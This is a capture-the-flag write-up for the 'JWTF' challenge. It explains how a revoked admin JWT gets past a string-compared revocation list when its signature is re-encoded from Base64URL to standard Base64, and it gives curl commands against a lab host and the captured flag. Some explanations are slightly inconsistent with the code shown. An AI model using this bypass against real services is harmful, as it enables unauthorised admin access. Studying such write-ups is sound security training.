**Challenge Title:** JWTF

**Vulnerability:** JWT Revocation List (JRL) Bypass via Signature Encoding Mismatch

---

## Source Code & Key Endpoints

```python
# server.py (excerpt)

FLAG = open('flag.txt','r').read()
APP_SECRET = os.urandom(32).hex()
ADMIN_SECRET = os.urandom(32).hex()

# JRL holds revoked tokens
jrl = [
    jwt.encode({"admin": True, "uid": '1337'}, APP_SECRET, algorithm="HS256")
]

@app.route('/get_admin_cookie')
def get_admin_cookie():
    secret = request.args.get('adminsecret')
    uid    = request.args.get('uid')
    if secret == ADMIN_SECRET and uid != '1337':
        resp = make_response('Cookie set')
        resp.set_cookie('session',
            jwt.encode({"admin": True, "uid": uid}, APP_SECRET, algorithm="HS256"))
        return resp
    return redirect('/')

@app.route('/flag')
def flag():
    session = request.cookies.get('session','').strip().replace('=','')
    if session in jrl:                    # ← JRL string‐compare check
        return redirect('/')
    payload = jwt.decode(session, APP_SECRET, algorithms=["HS256"])
    if payload.get('admin'):
        return FLAG
    return redirect('/')
```

---

## Why `/get_admin_cookie` Fails

We cannot forge an admin token at `/get_admin_cookie` because we don’t know **ADMIN\_SECRET**, which is a random 32-byte hex string generated at startup and never revealed.

---

## What We Need for the Flag

1. A valid JWT with `"admin": true`.
2. That token **must not** match any entry in **jrl** (the revocation list).

---

## What to Bypass

The server’s `/flag` endpoint performs a **raw string comparison** against `jrl` **before** decoding the token (line marked above). If our token string ≠ any in `jrl`, it proceeds to verify and decode.

---

## Exploit Steps

### 1. Retrieve the Revoked Admin Token

```bash
curl http://HOST:1337/jrl
```

```json
[
  "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.
   eyJhZG1pbiI6dHJ1ZSwidWlkIjoiMTMzNyJ9.
   BnBYDobZVspWbxu4jL3cTfri_IxNoi33q-TRLbHV-ew"
]
```

### 2. Convert Signature Encoding

* **JWT format**: `<header>.<payload>.<signature>` where header/payload/signature are **Base64URL**-encoded ([JSON Web Tokens - jwt.io][1]).
* **Base64URL** replaces `+`→`-`, `/`→`_` and omits `=` padding ([Medium][2]).
* We change only the signature segment:

  ```diff
  - BnBYDobZVspWbxu4jL3cTfri_IxNoi33q-TRLbHV-ew
  + BnBYDobZVspWbxu4jL3cTfri/IxNoi33q+TRLbHV+ew==
  ```

  (replace `-`→`+`, `_`→`/`, then add `=` until length mod 4 = 0) ([Base64 Guru][3]).

### 3. Why This Bypasses JRL

* The server checks `if session in jrl:` using a **byte‐for‐byte** comparison of the cookie string.
* Our re-encoded JWT string no longer matches the stored JRL entry, so it skips the revoke check ([GitHub][4]).
* PyJWT’s decoder happily accepts the padded Base64 signature even though RFC 7515 mandates unpadded Base64URL for JWTs ([IETF][5]).

```diff
@app.route('/flag')
def flag():
    session = request.cookies.get('session','').strip().replace('=','')
-   if session in jrl:
+   if session in jrl:   # our modified string ≠ original
        return redirect('/')
    payload = jwt.decode(session, APP_SECRET, algorithms=["HS256"])
```

### 4. Fetching the Flag

Set your `session` cookie to the modified token and request `/flag`:

```bash
curl -b "session=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJhZG1pbiI6dHJ1ZSwidWlkIjoiMTMzNyJ9.BnBYDobZVspWbxu4jL3cTfri/IxNoi33q+TRLbHV+ew==" \
     http://HOST:1337/flag
```

**Flag:**

```
byuctf{idk_if_this_means_anything_but_maybe_its_useful_somewhere_97ba5a70d94d}
```

[1]: https://jwt.io/introduction?utm_source=chatgpt.com "JSON Web Token Introduction - jwt.io"
[2]: https://medium.com/%40bagdasaryanaleksandr97/understanding-base64-vs-base64-url-encoding-whats-the-difference-31166755bc26?utm_source=chatgpt.com "Understanding Base64 vs Base64 URL Encoding - Medium"
[3]: https://base64.guru/standards/base64url?utm_source=chatgpt.com "Base64URL | Base64 Standards"
[4]: https://github.com/jpadilla/pyjwt/issues/676?utm_source=chatgpt.com "JWTs containing base64 padding are erroneously accepted #676"
[5]: https://www.ietf.org/archive/id/draft-jones-json-web-token-02.html?utm_source=chatgpt.com "JSON Web Token (JWT) - IETF"
